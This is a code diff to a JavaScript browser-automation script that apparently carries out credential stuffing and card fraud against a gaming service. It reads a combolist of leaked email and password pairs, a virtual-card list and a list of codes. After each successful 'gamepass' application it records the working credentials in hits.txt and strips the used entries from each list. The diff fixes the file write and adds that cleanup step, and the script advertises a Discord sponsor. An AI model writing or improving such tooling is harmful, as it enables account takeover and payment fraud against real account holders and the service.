@@ -33,6 +33,33 @@ function readFileAndSplitLines(filePath) {
   });
 }
 
+function removeFirstLineFromFile(filePath) {
+    fs.readFile(filePath, 'utf8', (err, data) => {
+        if (err) {
+            console.error('Error reading file:', err);
+            return;
+        }
+
+        // Split the content by lines
+        const lines = data.split('\n');
+
+        // Remove the first line
+        lines.shift();
+
+        // Join the lines back together
+        const updatedContent = lines.join('\n');
+
+        // Write the updated content back to the file
+        fs.writeFile(filePath, updatedContent, 'utf8', err => {
+            if (err) {
+                console.error('Error writing to file:', err);
+                return;
+            }
+            console.log('First line removed from file:', filePath);
+        });
+    });
+}
+
 async function main() {
     console.log("This library is sponsored by XAG || https://discord.gg/z7A9wf6D");
 
@@ -148,9 +175,13 @@ async function main() {
     try {
         await page.getByTestId('ChangeNameButton').click();
         await console.log("Successfully applied gamepass!")
-        fs.append("hits.txt", `${email}:${password}\n`, function (err) {
+        fs.appendFile("hits.txt", `${email}:${password}\n`, function (err) {
         if (err) throw err;
         console.log('Saved!');
+        removeFirstLineFromFile("codes.txt");
+        removeFirstLineFromFile("combolist.txt");
+        removeFirstLineFromFile("vcc.txt");
+        console.log("cleaned uppp")
         });
     }
     catch (exception) {
